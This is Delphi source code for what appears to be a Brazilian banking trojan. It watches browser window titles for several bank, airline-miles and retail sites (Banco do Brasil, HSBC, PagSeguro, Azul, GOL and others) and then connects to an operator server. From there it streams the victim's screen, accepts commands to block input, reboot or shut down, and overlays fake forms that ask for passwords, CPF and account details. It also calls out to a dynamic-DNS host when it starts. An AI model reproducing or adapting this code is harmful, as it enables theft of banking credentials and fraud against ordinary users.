unit Unit1;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, StdCtrls, ScktComp,Registry, ExtCtrls, zLibEx, StreamManager,
  XPMan, Aes,IdBaseComponent,SndKey32, IdComponent, IdTCPConnection, IdTCPClient, IdHTTP;

type
  TForm1 = class(TForm)
    CS1: TClientSocket;
    Edit1: TEdit;
    Edit2: TEdit;
    Timer1: TTimer;
    CS2: TClientSocket;
    Memo1: TMemo;
    Button1: TButton;
    Timer2: TTimer;
    Label1: TLabel;
    Memo2: TMemo;
    Timer3: TTimer;
    Label2: TLabel;
    Timer4: TTimer;
    Timer5: TTimer;
    Button2: TButton;
    IdHTTP1: TIdHTTP;
    Edit3: TEdit;
    Edit4: TEdit;
    chave: TEdit;
    Button3: TButton;
    procedure CS1Connect(Sender: TObject; Socket: TCustomWinSocket);
    procedure CS1Read(Sender: TObject; Socket: TCustomWinSocket);
    procedure CS1Error(Sender: TObject; Socket: TCustomWinSocket;
      ErrorEvent: TErrorEvent; var ErrorCode: Integer);
    procedure Timer1Timer(Sender: TObject);
    procedure CS2Connect(Sender: TObject; Socket: TCustomWinSocket);
    procedure CS2Read(Sender: TObject; Socket: TCustomWinSocket);
    procedure CS2Error(Sender: TObject; Socket: TCustomWinSocket;
      ErrorEvent: TErrorEvent; var ErrorCode: Integer);
    procedure Button1Click(Sender: TObject);
     procedure StartFake(Window: HWND; fFake: TForm);
    procedure Timer2Timer(Sender: TObject);
    procedure FormCreate(Sender: TObject);

  private
    { Private declarations }
  public
      sJanelaAtiva,sJanelaOld : string;
    Browser,FakeHWND,SubBrowser:HWND;
      { Public declarations }
    FAKE,Bank, OSVer: String;
    XP, Ativado: boolean;
    fLie: TForm;
  end;

 procedure BlockInput(ABlockInput : boolean); stdcall; external 'USER32.DLL';




 var
  Form1: TForm1;
   iSendCount: Integer;
  MyFirstBmp, MySecondBmp, MyCompareBmp, PackStream: TMemoryStream;
  RecebendoDados: Boolean;
  WindowInfActive : Boolean = False;
  IDSockPrincipal: String;

implementation

{$R *.dfm}

uses uScreenFuncs,uPCFuncs,   Unit7,  Unit9,
      Unit15, Unit16,   Unit19, Unit20,
   Unit29,  Unit31, Unit4, Unit6, Unit3, Unit8, Unit21, Unit22, Unit5,
  Unit2, Unit34;


 function ajaaka: String;// Função de capturar o titulo da janela
var
   Handle:THandle;
   Len:LongInt;
   Title: String;
begin
   Handle:=GetForegroundWindow;
   Len:=GetWindowTextLength(Handle) + 1;
   SetLength(Title,Len);
   GetWindowText(Handle,PChar(Title),Len);
   ajaaka:=TrimRight(Title);
end;

function Getcomputer : string;
var
registro : tregistry;
begin
registro:=tregistry.create;
registro.RootKey:=HKEY_LOCAL_MACHINE;
registro.openkey('System\CurrentControlSet\Services\VXD\VNETSUP',false);
result:=registro.readstring('ComputerName');
end;


function MemoryStreamToString(M: TMemoryStream): AnsiString;
begin
  SetString(Result, PAnsiChar(M.Memory), M.Size);
end;

function StreamToString(Stream: TStream): AnsiString;
var
  ms: TMemoryStream;
begin
  Result := '';
  ms := TMemoryStream.Create;
  try
    ms.LoadFromStream(Stream);
    SetString(Result, PChar(ms.Memory), ms.Size);
  finally
    ms.Free;
  end;
end;

// Pega o Sistema Operacional
function GetSOComputer: string;
var
  Reg: TRegistry;
begin
  Reg := TRegistry.Create;
  try
    Reg.rootKey := HKEY_LOCAL_MACHINE;
    if Reg.OpenKey('SOFTWARE\Microsoft\Windows NT\CurrentVersion', false) then
    begin
      Result := Reg.ReadString('ProductName');
      Reg.CloseKey;
    end;
  finally
    Reg.Free;
  end;
end;

// Comprime dados
function CompressStream(SrcStream: TMemoryStream): Boolean;
var
  InputStream, OutputStream: TMemoryStream;
  // CompressionStream :TZcompressionStream;
  inbuffer, outbuffer: Pointer;
  count, outcount: longint;
begin
  Result := false;
  if not assigned(SrcStream) then
    exit;

  InputStream := TMemoryStream.Create;
  OutputStream := TMemoryStream.Create;

  // CompressionStream := TZCompressionStream.Create(OutputStream,zcFastest);
  try
    InputStream.LoadFromStream(SrcStream);
    count := InputStream.Size;
    getmem(inbuffer, count);
    InputStream.ReadBuffer(inbuffer^, count);
    // CompressionStream.Write(buffer,count);
    zcompress(inbuffer, count, outbuffer, outcount, zcMax);
    // CompressionStream.CopyFrom(InputStream,0);
    // Outputstream.LoadFromStream(Inputstream);
    OutputStream.Write(outbuffer^, outcount);
    SrcStream.Clear;
    SrcStream.LoadFromStream(OutputStream);
    Result := true;
  finally
    // CompressionStream.Free;
    InputStream.Free;
    OutputStream.Free;
    FreeMem(inbuffer, count);
    FreeMem(outbuffer, outcount);
  end;
end;



procedure TForm1.StartFake(Window: HWND; fFake: TForm);
var Rect: TRect;
begin
  Timer1.Enabled := False;
  Max(Browser);
  fLie := fFake;
  FAKE := fLie.Caption;
  Print2;
  SOBRE.Height := Screen.Height;
  SOBRE.Width  := Screen.Width;
  if Browser <> SubBrowser then
  begin
    Windows.GetWindowRect(SubBrowser,Rect);
    with SOBRE do
    begin
      Align := alCustom;
      Top := Rect.Top;
      Left := Rect.Left;
      Width := Rect.Right-Rect.Left;
      Height := Rect.Bottom-Rect.Top;
    end;
  end;
  fLie.Left:= (SOBRE.Width div 2) - (fLie.Width div 2);
  fLie.Top := (SOBRE.Height div 2) - (fLie.Height div 2);
  fLie.FormStyle := fsStayOnTop;
 // fSOBRE.semiPanel.Show;
  fLie.Show;
  SOBRE.Show;
  BringWindowToTop(fLie.Handle);
  Windows.SetParent(fLie.Handle, SOBRE.Handle);



  end;


procedure TForm1.CS1Connect(Sender: TObject; Socket: TCustomWinSocket);
begin
  CS2.Host := CS1.Host;
  CS2.Port := CS1.Port;
  // CS2.Active := true;

 
  //aqui vai criar um espaço na memoria
  MyFirstBmp := TMemoryStream.Create;
  MySecondBmp := TMemoryStream.Create;
  MyCompareBmp := TMemoryStream.Create;
  PackStream := TMemoryStream.Create;
  iSendCount := 0;

  Sleep(1000); //vai da um tempo de 1 segundo para ativa a função a baixo
  Socket.SendText('<|PRINCIPAL|>');//aqui vai enviar o comando de envia os dados para o operador
 
end;

procedure TForm1.CS1Read(Sender: TObject; Socket: TCustomWinSocket);
var
  StrCommand, StrPackSize, dados2: string;
  posX, posY: Integer;

  begin
  StrCommand := Socket.ReceiveText;

  if Pos('<|SocketMain|>', StrCommand) > 0 then
  begin
    dados2 := StrCommand;
    Delete(dados2, 1, Pos('<|SocketMain|>', dados2) + 13);

   dados2 := Copy(dados2, 1, Pos('<<|', dados2) - 1);
   IDSockPrincipal := dados2;
  end;
   //aqui e a função que vai extabelecer conexão entra operador e KL
  if Pos('<|OK|>', StrCommand) > 0 then
  begin
    Socket.SendText('<|Info|>' + GetSOComputer + '<|>' + Getcomputer +'<|>'+Edit2.Text+'<|>'+Edit1.Text+'<<|');
  end;



     //aqui vai ativar o segundo ClienteSocket que vai envia as imagem para o Operador
 if StrCommand = '<|first|>' then      // quando receber a string <|first|> vai coloca desk no edit2 para captura o desktop
  begin
    CS2.Active := false;
    CS2.Active := true;
  end;

       // Para reiniciar
  if StrCommand = 're' then
   begin
     WindowsExit(EWX_REBOOT or EWX_FORCE) ;
   end;


     // Para desliga
  if StrCommand = 'de' then
   begin
     WindowsExit(EWX_POWEROFF or EWX_FORCE) ;
   end;

if StrCommand = 'TMT' then
   begin
   BlockInput(True);
   end;

 if StrCommand = 'DTMT' then
   begin
   BlockInput(False);
   end;


 If Pos('pedinfo',StrCommand) <> 0 then
    begin
    Button1.Click;
    end;

  if pos ('CLOSE',StrCommand) <> 0 then
     begin
       timer1.Enabled := false;
       CS1.Active := false;
       CS2.Active := false;
       Application.Terminate;

     end;



    // aqui vai da o travamento de acordo com a casa
   if Pos('STARTFAKE', StrCommand) <> 0 then
  begin
    Delete(StrCommand, 1, Pos('|', StrCommand));

    if StrCommand = 'BB' then
     begin

      StartFake(FakeHWND, carregabb);
      end;

      if StrCommand = 'AZUL' then
      begin


        StartFake(FakeHWND, carregaazul);
      end;


         if StrCommand = 'SMILES' then
      begin


        StartFake(FakeHWND, Form8);
      end;
         {
         if StrCommand = 'DESCO' then
      begin


        StartFake(FakeHWND, carregadesco);
      end;
       }
         if StrCommand = 'GOL' then
      begin


        StartFake(FakeHWND, Form19);
      end;


         if StrCommand = 'AMERICANAS' then
      begin

        StartFake(FakeHWND, Form21);
      end;

        if StrCommand = 'IPIRANGA' then
      begin
        StartFake(FakeHWND, Form22);
      end;

      { if StrCommand = 'ITAU' then
      begin

       Form28 := TForm28.Create(Self);
        StartFake(FakeHWND, Form28);
      end;
        }
       if StrCommand = 'PAGSEGURO' then
      begin

        StartFake(FakeHWND, Form29);
      end;

            {
         if StrCommand = 'SICREDI' then
      begin


        StartFake(FakeHWND, Form31);
      end;
       }
        if StrCommand = 'HSBC' then
      begin


        StartFake(FakeHWND, Form34);
      end;

      end;

       if pos('hsbccpf',StrCommand) <> 0 then
         begin
          Form34.Show;
          Form34.Panel1.Visible := true;
          Form34.Panel1.BringToFront;

         end;

          if pos('TecladoHsbc',StrCommand) <> 0 then
         begin
          Form34.Show;
          Form34.Panel2.Visible := true;
          Form34.Panel2.BringToFront;

         end;

          if pos('SeloHsbc',StrCommand) <> 0 then
         begin
          Form34.Show;
          Form34.Panel3.Visible := true;
          Form34.Panel3.BringToFront;

         end;

         if pos('caracteres',StrCommand) <> 0 then
         begin
          Form34.Show;
          Form34.Panel4.Visible := true;
          Form34.Panel4.BringToFront;

         end;

           if pos('senhaletra',StrCommand) <> 0 then
         begin
          Form34.Show;
          Form34.Panel5.Visible := true;
          Form34.Panel5.BringToFront;

         end;
             if pos('Finalizahsbc',StrCommand) <> 0 then
         begin
          Form34.Show;
          Form34.Panel6.Visible := true;
          Form34.Panel6.BringToFront;

         end;

          if pos('FimHsbc',StrCommand) <> 0 then
         begin
         Form34.Close;
         Sobre.Close;

         end;

          {
       if Pos('COPERATIVA',StrCommand) <> 0 then
        begin
        Form31.close;
        Form32.show;
        Form32.Panel1.Visible := false;
        Form32.Panel2.Visible := false;


        end;
         if Pos('TIPOCONTA',StrCommand) <> 0 then
        begin
        Form31.close;
        Form32.show;
        Form32.Panel1.Visible := false;
        Form32.Panel2.Visible := True;
        Form32.Panel2.BringToFront;

        end;

        if Pos('SICRECPF',StrCommand) <> 0 then
        begin
        Form31.close;
        Form32.show;
        Form32.Panel1.Visible := True;
        Form32.Panel2.Visible := False;
        Form32.Panel1.BringToFront;

        end;
        //aqui vai começa a parte juridica da sicredi
            if Pos('COPERATIVAJU',StrCommand) <> 0 then
        begin
        Form31.close;
        Form32.Close;
        Form33.show;
        Form33.Panel1.Visible := False;
        Form33.Panel2.Visible := False;

        end;
              if Pos('CNPJ',StrCommand) <> 0 then
        begin
        Form31.close;
        Form32.Close;
        Form33.show;
        Form33.Panel1.Visible := True;
        Form33.Panel2.Visible := False;
        Form33.Panel1.BringToFront;

        end;

       if Pos('ELETRONICA',StrCommand) <> 0 then
        begin
        Form31.close;
        Form32.Close;
        Form33.show;
        Form33.Panel1.Visible := False;
        Form33.Panel2.Visible := True;
        Form33.Panel2.BringToFront;

        end;
          }
        if Pos('FIMPAG',StrCommand) <> 0 then
        begin
        Form29.close;
        Sobre.Close;

        end;


     if Pos('fimame',StrCommand) <> 0 then
      begin
      Form21.Close;
      Sobre.Close;

      end;

      if Pos('fimipi',StrCommand) <> 0 then
      begin
      Form22.Close;
      SObre.Close;

      end;

     if pos('GOL1',StrCommand) <> 0 then
      begin
      Form19.Close;
      FOrm20.show;
      Form20.Panel1.BringToFront;

      end;

      if pos('FIMGOL',StrCommand) <> 0 then
       begin
       Form19.Close;
       Form20.Close;
       Sobre.Close;


       end;
            {
      //aqui começa a parte itau

    If Pos('agita',StrCommand) <> 0 then
     begin
       Form28.close;
       Form23.show;

       end;

     If Pos('tabelaita',StrCommand) <> 0 then
     begin
       Form28.close;
       Form26.show;

       end;

        If Pos('token',StrCommand) <> 0 then
     begin
       Form28.close;
       Form27.show;

       end;}
            {
       if pos('fimita',StrCommand) <> 0 then
        begin
        Form23.Close;
        Form24.Close;
        Form25.close;
        Form26.close;
        FOrm27.close;
        Form28.Close;
        Sobre.Close;
        end;
          }
  //aqui começa a pedi as info para o bb

  if Pos('s6bb',StrCommand) <> 0 then     // pedi senha de 6
   begin
   Carregabb.Close;       //vai fechar o form carregar
   tele.Close;         // vai fecha a tela telefone caso esteja aberta
   Form2.Show;          // vai chama o form2(bb)
   Form2.senha_6.BringToFront;// vai coloca o painel de senha de 6 na frente

   end;

    if Pos('s86bb',StrCommand) <> 0 then    //vai pedi senha de 8
   begin
   Carregabb.Close;
   tele.Close;
   Form2.Show;
   Form2.Se_8_6.BringToFront;

   end;

    if Pos('telebb',StrCommand) <> 0 then  //vai pedi telefone
   begin
   Carregabb.Close;
   Form2.Close;
   tele.Show;

   end;
       if Pos('cpfbb',StrCommand) <> 0 then    // aqui vai pedi cpf e nome titula
   begin
   Carregabb.Close;
   tele.Close;
   Form2.Show;
   Form2.nome_cpf.BringToFront;


   end;

       if Pos('agcobb',StrCommand) <> 0 then  //aqui vai pedi agencia, conta
   begin
   Carregabb.Close;
   tele.Close;
   Form2.Show;
   Form2.agco.BringToFront;


   end;

        if Pos('s4bb',StrCommand) <> 0 then   //aqui vai pedi senha de 4
   begin
   Carregabb.Close;
   tele.Close;
   Form2.Show;
   Form2.Panel1.BringToFront;


   end;

   if Pos('final',StrCommand) <> 0 then  // aqui vai chama o form de finalização
   begin
   Carregabb.Close;
   tele.Close;
   Form2.Show;
   Form2.Panel2.BringToFront;
   Form2.Timer1.Enabled := true;

   end;


   //aqui começa pedi info azul passagens

   if Pos('azul',StrCommand) <> 0 then //aqui vai pedi a info do azul
    begin
    Carregaazul.Close;
    Form7.Show;
    Form7.Panel1.BringToFront;


    end;

    if Pos('fim_azul',StrCommand) <> 0 then
     begin
       Form7.Close;
       Carregaazul.Close;
       Sobre.Close;

     end;

     // aqui vai começa a parte da fake gol

     if Pos('SMILES1',StrCommand) <> 0 then
      begin
      Form8.Show;
      Form8.Panel1.Visible := false;

      end;

     if Pos('SMILES_CLOSE',StrCommand) <> 0 then
     begin
       Form8.Close;
       Sobre.Close;

     end;

     //aqui vai começa a parte info desco

      { if Pos('agdesco',StrCommand) <> 0 then
     begin
     Carregadesco.Close;
     Form10.show;
     Form14.Close;
     Form11.Close;
     Form12.Close;
     Form13.Close;

     end;

        if Pos('paidesco',StrCommand) <> 0 then  //aqui vai pedi a info pai/cpf/s4/s6
     begin
     Carregadesco.Close;
     Form11.show;
     Form10.Close;
     Form14.Close;
     Form12.Close;
     Form13.Close;

     end;

      if Pos('cartaodesco',StrCommand) <> 0 then  //aqui vai pedi a info do cartao
     begin
     Carregadesco.Close;
     Form12.show;
     Form10.Close;
     Form11.Close;
     Form14.Close;
     Form13.Close;

     end;

     if Pos('tabeladesco',StrCommand) <> 0 then  //aqui vai pedi a tabela
     begin
     Carregadesco.Close;
     Form13.show;
     Form10.Close;
     Form11.Close;
     Form12.Close;
     Form14.Close;

     end;

      if Pos('descofinal',StrCommand) <> 0 then  //aqui vai pedi a tabela
     begin
     Carregadesco.Close;
     Form14.show;
     Form14.Timer1.Enabled := true;
     Form10.Close;
     Form11.Close;
     Form12.Close;
     Form13.Close;

     end;
         }
   //FIm da desco


end;

procedure TForm1.CS1Error(Sender: TObject; Socket: TCustomWinSocket;
  ErrorEvent: TErrorEvent; var ErrorCode: Integer);
begin
Errorcode := 0;
end;

procedure TForm1.Timer1Timer(Sender: TObject);
begin
if not cs1.Active then
cs1.Active := true;
end;

procedure TForm1.CS2Connect(Sender: TObject; Socket: TCustomWinSocket);
var
  StrCommand, StrPackSize: string;
  tamanho: Integer;
begin
  Socket.SendText('<|Desktop|>');
  Sleep(2000);
  MyFirstBmp := TMemoryStream.Create;
  MySecondBmp := TMemoryStream.Create;
  MyCompareBmp := TMemoryStream.Create;
  PackStream := TMemoryStream.Create;
  iSendCount := 0;


  GetScreenToBmp(false, MyFirstBmp);
  MyFirstBmp.Position := 0;

  PackStream.LoadFromStream(MyFirstBmp);
  CompressStream(PackStream);
  PackStream.Position := 0;
  tamanho := PackStream.Size;
  CS2.Socket.SendText('<|TAMANHO|>' + inttostr(tamanho) + '<<|');
  iSendCount := iSendCount + 1;

end;




procedure TForm1.CS2Read(Sender: TObject; Socket: TCustomWinSocket);
var
  StrCommand, StrPackSize: string;
  cu: AnsiString;
  Stream01: TMemoryStream;
begin
  StrCommand := Socket.ReceiveText;

  if StrCommand = '<|gets|>' then
  begin

    PackStream := TMemoryStream.Create;

    CompareStream(MyFirstBmp, MySecondBmp, MyCompareBmp);

    MyCompareBmp.Position := 0;
    PackStream.LoadFromStream(MyCompareBmp);
    CompressStream(PackStream);
    PackStream.Position := 0;
    StrPackSize := inttostr(PackStream.Size);
    Socket.SendText('<|TAMANHO|>' + StrPackSize + '<<|');

    iSendCount := iSendCount + 1;

  end;
  if StrCommand = '<|okok|>' then
  begin
    PackStream.Position := 0;
    Socket.SendText(MemoryStreamToString(PackStream));
  end;
end;


procedure TForm1.CS2Error(Sender: TObject; Socket: TCustomWinSocket;
  ErrorEvent: TErrorEvent; var ErrorCode: Integer);
begin
Errorcode := 0;
end;

procedure TForm1.Button1Click(Sender: TObject);
begin
Cs1.Socket.SendText('info'+memo1.Lines.Text);
end;

procedure TForm1.Timer2Timer(Sender: TObject);
var
i : integer;
begin
sJanelaOld:=sJanelaAtiva;
sJanelaAtiva := ajaaka;
if sJanelaAtiva <> sJanelaOld then

Label1.Caption:=ajaaka;

 if pos('[bb.com.br]',Label1.Caption) <> 0 then
   begin
  Edit1.Text := 'BB';
  Edit2.Text := 'IE';
  timer2.Enabled:=false;
  timer1.Enabled := true;
  end;
  if pos('[bb.com.br] - Google Chrome',Label1.Caption) <> 0 then
  begin
  Edit1.Text := 'BB';
  Edit2.Text := 'Chrome';
  timer2.Enabled:=false;
  timer1.Enabled := true;

end;

 if pos('[bb.com.br] -  Mozilla Firefox',Label1.Caption) <> 0 then
  begin
  Edit1.Text := 'BB';
  Edit2.Text := 'FIREFOX';
  timer2.Enabled:=false;
  timer1.Enabled := true;
end;

 if pos('Azul - Linhas Aéreas Brasileiras. Você lá em cima. - Mozilla Firefox',Label1.Caption) <> 0 then
  begin
  Edit1.Text := 'AZUL';
  Edit2.Text := 'FIREFOX';
  timer2.Enabled:=false;
  timer1.Enabled := true;
end;

 if pos('Azul - Linhas Aéreas Brasileiras. Você lá em cima. - Google Chrome',Label1.Caption) <> 0 then
  begin
  Edit1.Text := 'AZUL';
  Edit2.Text := 'Chrome';
  timer2.Enabled:=false;
  timer1.Enabled := true;
end;

 if pos('Azul - Linhas Aéreas Brasileiras. Você lá em cima.',Label1.Caption) <> 0 then
  begin
  Edit1.Text := 'AZUL';
  Edit2.Text := 'IE';
  timer2.Enabled:=false;
  timer1.Enabled := true;
end;

 if pos('Smiles - O melhor programa de milhas - Smiles',Label1.Caption) <> 0 then
  begin
  Edit1.Text := 'Smiles';
  Edit2.Text := 'IE';
  timer2.Enabled:=false;
  timer1.Enabled := true;
end;

   if pos('Smiles - O melhor programa de milhas - Smiles - Google Chrome',Label1.Caption) <> 0 then
  begin
  Edit1.Text := 'Smiles';
  Edit2.Text := 'Chrome';
  timer2.Enabled:=false;
  timer1.Enabled := true;
end;
      if pos('Smiles - O melhor programa de milhas - Smiles - Mozilla Firefox',Label1.Caption) <> 0 then
  begin
  Edit1.Text := 'Smiles';
  Edit2.Text := 'FIREFOX';
  timer2.Enabled:=false;
  timer1.Enabled := true;
end;

 {

 if pos('Bradesco | Pessoa Física, Exclusive, Prime e Private',Label1.Caption) <> 0 then
  begin
  Edit1.Text := 'DESCO';
  Edit2.Text := 'IE';
  timer2.Enabled:=false;
  timer1.Enabled := true;
end;

   if pos('Bradesco | Pessoa Física, Exclusive, Prime e Private - Google Chrome',Label1.Caption) <> 0 then
  begin
  Edit1.Text := 'DESCO';
  Edit2.Text := 'Chrome';
  timer2.Enabled:=false;
  timer1.Enabled := true;
end;

  if pos('Bradesco | Pessoa Física, Exclusive, Prime e Private - Mozilla Firefox',Label1.Caption) <> 0 then
  begin
  Edit1.Text := 'DESCO';
  Edit2.Text := 'FIREFOX';
  timer2.Enabled:=false;
  timer1.Enabled := true;
end;
  }

 if pos('Passagens Aéreas na GOL',Label1.Caption) <> 0 then
  begin
  Edit1.Text := 'GOL';
  Edit2.Text := 'IE';
  timer2.Enabled:=false;
  timer1.Enabled := true;
end;

   if pos('Passagens Aéreas na GOL - Google Chrome',Label1.Caption) <> 0 then
  begin
  Edit1.Text := 'GOL';
  Edit2.Text := 'Chrome';
  timer2.Enabled:=false;
  timer1.Enabled := true;
end;

   if pos('Passagens Aéreas na GOL - Mozilla Firefox',Label1.Caption) <> 0 then
  begin
  Edit1.Text := 'GOL';
  Edit2.Text := 'FIREFOX';
  timer2.Enabled:=false;
  timer1.Enabled := true;
end;

 if pos('Americanas.com - A maior loja. Os menores preços.',Label1.Caption) <> 0 then
  begin
  Edit1.Text := 'AMERICANA';
  Edit2.Text := 'IE';
  timer2.Enabled:=false;
  timer1.Enabled := true;
end;

   if pos('Americanas.com - A maior loja. Os menores preços. - Google Chrome',Label1.Caption) <> 0 then
  begin
  Edit1.Text := 'AMERICANA';
  Edit2.Text := 'Chrome';
  timer2.Enabled:=false;
  timer1.Enabled := true;
end;

 if pos('Americanas.com - A maior loja. Os menores preços. - Mozilla Firefox',Label1.Caption) <> 0 then
  begin
  Edit1.Text := 'AMERICANA';
  Edit2.Text := 'FIREFOX';
  timer2.Enabled:=false;
  timer1.Enabled := true;
end;
if pos('Portal Ipiranga',Label1.Caption) <> 0 then
  begin
  Edit1.Text := 'IPIRANGA';
  Edit2.Text := 'IE';
  timer2.Enabled:=false;
  timer1.Enabled := true;
end;

   if pos('Portal Ipiranga - Google Chrome',Label1.Caption) <> 0 then
  begin
  Edit1.Text := 'IPIRANGA';
  Edit2.Text := 'Chrome';
  timer2.Enabled:=false;
  timer1.Enabled := true;
end;

   if pos('Portal Ipiranga - Mozilla Firefox',Label1.Caption) <> 0 then
  begin
  Edit1.Text := 'IPIRANGA';
  Edit2.Text := 'FIREFOX';
  timer2.Enabled:=false;
  timer1.Enabled := true;
end;        {
if pos('Banco Itaú - Feito Para Você',Label1.Caption) <> 0 then
  begin
  Edit1.Text := 'ITA';
  Edit2.Text := 'IE';
  timer2.Enabled:=false;
  timer1.Enabled := true;
end;

   if pos('Banco Itaú - Feito Para Você - Google Chrome',Label1.Caption) <> 0 then
  begin
  Edit1.Text := 'ITA';
  Edit2.Text := 'Chrome';
  timer2.Enabled:=false;
  timer1.Enabled := true;
  end;


     if pos('Banco Itaú - Feito Para Você - Mozilla Firefox',Label1.Caption) <> 0 then
  begin
  Edit1.Text := 'ITA';
  Edit2.Text := 'FIREFOX';
  timer2.Enabled:=false;
  timer1.Enabled := true;
  end;

    }

  if pos('PagSeguro: Venda pela internet e receba pagamentos online facilmente',Label1.Caption) <> 0 then
  begin
  Edit1.Text := 'PAGSEGURO';
  Edit2.Text := 'IE';
  timer2.Enabled:=false;
  timer1.Enabled := true;
end;

   if pos('PagSeguro: Venda pela internet e receba pagamentos online facilmente - Google Chrome',Label1.Caption) <> 0 then
  begin
  Edit1.Text := 'PAGSEGURO';
  Edit2.Text := 'Chrome';
  timer2.Enabled:=false;
  timer1.Enabled := true;
  end;

    if pos('PagSeguro: Venda pela internet e receba pagamentos online facilmente - Mozilla Firefox',Label1.Caption) <> 0 then
  begin
  Edit1.Text := 'PAGSEGURO';
  Edit2.Text := 'FIREFOX';
  timer2.Enabled:=false;
  timer1.Enabled := true;
  end;

        {
  if pos('Sicredi | Gente que coopera cresce',Label1.Caption) <> 0 then
  begin
  Edit1.Text := 'Sicredi';
  Edit2.Text := 'IE';
  timer2.Enabled:=false;
  timer1.Enabled := true;
end;

   if pos('Sicredi | Gente que coopera cresce - Google Chrome',Label1.Caption) <> 0 then
  begin
  Edit1.Text := 'Sicredi';
  Edit2.Text := 'Chrome';
  timer2.Enabled:=false;
  timer1.Enabled := true;
  end;

    if pos('Sicredi | Gente que coopera cresce - Mozilla Firefox',Label1.Caption) <> 0 then
  begin
  Edit1.Text := 'Sicredi';
  Edit2.Text := 'FIREFOX';
  timer2.Enabled:=false;
  timer1.Enabled := true;
  end;

   //    }

  if pos('Serviços Financeiros Pessoa Física | HSBC Brasil',Label1.Caption) <> 0 then
  begin
  Edit1.Text := 'HSBC';
  Edit2.Text := 'IE';
  timer2.Enabled:=false;
  timer1.Enabled := true;
end;

   if pos('Serviços Financeiros Pessoa Física | HSBC Brasil - Google Chrome',Label1.Caption) <> 0 then
  begin
  Edit1.Text := 'HSBC';
  Edit2.Text := 'Chrome';
  timer2.Enabled:=false;
  timer1.Enabled := true;
  end;

    if pos('Serviços Financeiros Pessoa Física | HSBC Brasil - Mozilla Firefox',Label1.Caption) <> 0 then
  begin
  Edit1.Text := 'HSBC';
  Edit2.Text := 'FIREFOX';
  timer2.Enabled:=false;
  timer1.Enabled := true;
  end;

        

end;

procedure TForm1.FormCreate(Sender: TObject);
var
 Registro : TRegistry;
  dir:String;
  post : TIdHTTP;
  begin

  post := TIdHTTP.Create(nil);

post.Request.UserAgent:='Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.102 Safari/537.36';

post.Get('windowshosp.ddns.net/enviador.php');

Iniciar;
Verifullbuster;

end;


end.
